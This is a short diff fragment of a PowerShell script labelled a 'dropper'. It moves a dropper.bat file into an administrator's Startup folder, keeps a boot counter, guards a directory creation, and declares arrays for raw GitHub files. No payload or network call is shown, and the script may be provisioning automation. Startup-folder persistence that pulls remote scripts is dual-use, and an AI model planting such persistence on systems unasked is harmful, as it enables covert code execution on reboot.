@@ -14,7 +14,8 @@ $dropper = @'
 
 # Static Variables
 $countfile = 'C:\tempo\bootcount.txt'
-$bootbatch = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\dropper.bat'
+#$bootbatch = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\dropper.bat'
+ $bootbatch = "C:\Users\Administrateur.WIN-0R0LFKPGGL8\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\dropper.bat"
 $dropperscript = 'C:\tempo\dropper.ps1'
 
 #################
@@ -35,7 +36,7 @@ else { $bootcount = 1 }
 $bootcount | Out-File $countfile
 
 $cscrito = "C:\scripto"
-mkdir $cscrito
+if (!(Get-Item $cscrito -ea ignore)) { mkdir $cscrito }
 
 $scriptos = @()
 $RawGitHubFiles = @()
